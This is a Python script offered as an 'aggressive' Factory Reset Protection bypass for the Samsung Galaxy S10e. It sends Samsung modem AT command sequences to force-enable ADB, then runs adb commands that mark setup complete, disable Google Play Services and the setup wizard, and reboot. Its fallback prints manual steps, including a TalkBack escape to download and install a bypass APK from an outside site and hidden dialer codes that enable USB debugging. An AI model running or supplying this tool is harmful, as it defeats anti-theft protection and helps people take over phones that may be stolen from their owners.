#!/usr/bin/env python3
"""
Aggressive Galaxy S10e FRP Bypass
Uses multiple modem exploit sequences and alternative methods
"""

import subprocess
import time
import sys
import serial
from pathlib import Path

def progress(msg):
    print(f"[*] {msg}")

def run_adb_command(cmd, timeout=20):
    """Run ADB command with extended timeout"""
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
        return result.returncode == 0, result.stdout.strip(), result.stderr.strip()
    except subprocess.TimeoutExpired:
        return False, "", "Timeout"
    except Exception as e:
        return False, "", str(e)

def check_adb_device():
    """Check for ADB device with multiple attempts"""
    for _ in range(3):
        success, output, _ = run_adb_command("adb devices")
        if success and "device" in output:
            lines = output.split('\n')[1:]
            for line in lines:
                if 'device' in line and line.strip():
                    return True, line.strip().split('\t')[0]
        time.sleep(2)
    return False, None

def aggressive_modem_exploit():
    """Try multiple aggressive modem exploit sequences"""
    progress("Starting aggressive modem exploit...")
    
    try:
        # Find Samsung modem port
        ports = list(serial.tools.list_ports.comports())
        samsung_port = None
        
        for port in ports:
            if port.vid == 0x04E8 or "samsung" in port.description.lower():
                samsung_port = port.device
                progress(f"Found Samsung modem on {samsung_port}")
                break
        
        if not samsung_port:
            progress("No Samsung modem found")
            return False
        
        # Try multiple exploit sequences
        sequences = [
            # Sequence 1: Aggressive 2024 variant
            [
                "ATD*#0*#;",
                "AT+SWATD=0",
                "AT+ACTIVATE=0,0,0", 
                "AT+DEVCONINFO",
                "AT+VERSNAME=3.2.3",
                "AT+REACTIVE=1,0,0",
                "AT+SWATD=0",
                "AT+ACTIVATE=0,0,0",
                "AT+SWATD=1",
                "AT+SWATD=1",
                "AT+PRECONFIG=2,VZW",
                "AT+PRECONFIG=1,0",
                "AT+SWATD=0",
                "AT+ACTIVATE=1,0,0",
                "AT+SWATD=1"
            ],
            # Sequence 2: Extended 2022 variant  
            [
                "ATD*#0*#;",
                "AT+SWATD=0",
                "AT+ACTIVATE=0,0,0",
                "AT+DEVCONINFO",
                "AT+KSTRINGB=0,3",
                "AT+DUMPCTRL=1,0",
                "AT+DEBUGLVC=0,5",
                "AT+SWATD=1",
                "AT+ACTIVATE=0,0,0",
                "AT+SWATD=0",
                "AT+KSTRINGB=0,3",
                "AT+DUMPCTRL=1,0",
                "AT+DEBUGLVC=0,5"
            ] * 5,  # Repeat 5 times
            # Sequence 3: Legacy method
            [
                "ATD*#0*#;",
                "AT+DUMPCTRL=1,0",
                "AT+DEBUGLVC=0,5", 
                "AT+SWATD=0",
                "AT+ACTIVATE=0,0,0",
                "AT+SWATD=1",
                "AT+DEBUGLVC=0,5",
                "AT+REACTIVE=1,0,0"
            ]
        ]
        
        for i, sequence in enumerate(sequences, 1):
            progress(f"Trying aggressive sequence {i}...")
            
            try:
                ser = serial.Serial(samsung_port, 115200, timeout=3)
                time.sleep(1)
                
                for cmd in sequence:
                    try:
                        full_cmd = cmd.strip() + "\r\n"
                        ser.reset_input_buffer()
                        ser.write(full_cmd.encode())
                        time.sleep(0.1)
                    except:
                        pass
                
                ser.close()
                progress(f"Sequence {i} completed, waiting for ADB...")
                time.sleep(15)  # Extended wait time
                
                # Check if ADB appeared
                connected, device_id = check_adb_device()
                if connected:
                    progress(f"ADB device detected: {device_id}")
                    return True
                    
            except Exception as e:
                progress(f"Sequence {i} failed: {e}")
                try:
                    ser.close()
                except:
                    pass
        
    except Exception as e:
        progress(f"Modem exploit error: {e}")
    
    return False

def comprehensive_bypass_commands():
    """Run comprehensive bypass commands"""
    progress("Running comprehensive FRP bypass...")
    
    connected, device_id = check_adb_device()
    if not connected:
        return False
    
    progress(f"Device {device_id} connected, running bypass commands...")
    
    # Comprehensive command set
    commands = [
        # Basic setup completion
        "adb shell settings put secure user_setup_complete 1",
        "adb shell settings put global device_provisioned 1",
        
        # FRP removal
        "adb shell pm clear com.google.android.gms",
        "adb shell pm clear com.google.android.setupwizard",
        "adb shell pm disable com.google.android.setupwizard",
        "adb shell pm disable com.google.android.gms",
        
        # Settings manipulation
        "adb shell content insert --uri content://settings/secure --bind name:s:user_setup_complete --bind value:i:1",
        "adb shell content insert --uri content://settings/global --bind name:s:device_provisioned --bind value:i:1",
        "adb shell content insert --uri content://settings/secure --bind name:s:setup_wizard_has_run --bind value:i:1",
        
        # Account removal
        "adb shell am start -n com.android.settings/.Settings",
        "adb shell settings put secure skip_first_use_hints 1",
        
        # Force completion
        "adb shell am broadcast -a android.intent.action.BOOT_COMPLETED --ez state true",
        
        # Reboot
        "adb reboot"
    ]
    
    success_count = 0
    for cmd in commands:
        success, stdout, stderr = run_adb_command(cmd, timeout=30)
        if success:
            progress(f"✓ {cmd}")
            success_count += 1
        else:
            progress(f"✗ {cmd} failed")
        time.sleep(2)
    
    return success_count >= len(commands) // 2

def main():
    print("=" * 60)
    print("🚀 AGGRESSIVE GALAXY S10e FRP BYPASS")
    print("=" * 60)
    print()
    
    # Method 1: Aggressive modem exploits
    progress("METHOD 1: Aggressive Modem Exploits")
    if aggressive_modem_exploit():
        if comprehensive_bypass_commands():
            print("\n🎉 SUCCESS! FRP bypass completed!")
            print("Your device will reboot and should be accessible.")
            return True
    
    # Method 2: Check if device is already accessible
    progress("\nMETHOD 2: Direct Access Check")
    if comprehensive_bypass_commands():
        print("\n🎉 SUCCESS! FRP bypass completed!")
        return True
    
    # Method 3: Final manual instructions
    print("\n❌ Automated methods failed.")
    print("\nTry these manual methods on your S10e:")
    print("\n=== METHOD A: TalkBack + Chrome ===")
    print("1. Welcome screen > Accessibility > TalkBack > Enable")
    print("2. Draw 'L' shape > TalkBack Settings > Help & Feedback")
    print("3. 'Get started with TalkBack' > Long press text > Web Search")
    print("4. Chrome opens > Go to: frpfile.com/bypass")
    print("5. Download FRP bypass APK > Install > Open > Follow instructions")
    
    print("\n=== METHOD B: Emergency Call ===")
    print("1. Emergency Call > Dial: *#*#2846579#*#*")
    print("2. Project Menu > Backend Settings > USB Debugging ON")
    print("3. Re-run this script")
    
    print("\n=== METHOD C: Samsung Account ===")
    print("1. On Google verification, tap BACK")
    print("2. Select 'Samsung Account' instead")
    print("3. Create new Samsung account (no verification)")
    print("4. Complete setup to bypass Google FRP")
    
    print("\n=== METHOD D: Service Menu ===")
    print("1. Emergency Call > Dial: *#0808#")
    print("2. Select 'DM+MODEM+ADB' or similar")
    print("3. Re-run this script")
    
    return False

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\nBypass cancelled by user")
    except Exception as e:
        print(f"\n❌ Error: {e}")
        import traceback
        traceback.print_exc()
